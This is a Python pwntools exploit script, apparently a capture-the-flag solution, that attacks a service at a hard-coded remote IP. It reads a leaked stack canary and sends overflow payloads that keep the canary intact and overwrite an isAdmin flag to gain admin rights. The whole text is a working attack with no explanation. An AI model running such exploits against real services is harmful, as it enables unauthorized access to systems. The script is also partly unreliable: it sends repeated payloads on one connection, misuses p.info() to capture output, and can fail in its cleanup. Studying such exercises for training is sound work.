#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

try:
    # Connect to the remote service
    p = remote('170.64.222.246', 1340)

    # Read until "The canary is "
    p.recvuntil(b"The canary is ")
    canary_line = p.recvline()
    canary_value = int(canary_line.strip())

    print(f"Canary value: {hex(canary_value)}")

    for padding_length in [0, 4, 8]:
        print(f"\nTrying payload with {padding_length} bytes of padding:")

        # Prepare the payload
        payload = b'A' * 16                 # Fill the 'name' buffer
        payload += p32(canary_value)        # Overwrite CANARY with its original value
        payload += b'B' * padding_length    # Adjust padding
        payload += p32(1)                   # Set isAdmin to TRUE (1)

        # Print the payload in hex
        print(hexdump(payload))

        # Send the payload after "What is your name?"
        p.sendlineafter(b'> ', payload)

    output = p.info()
    print(output)

except Exception as e:
    print(f"An error occurred: {e}")
finally:
    p.close()
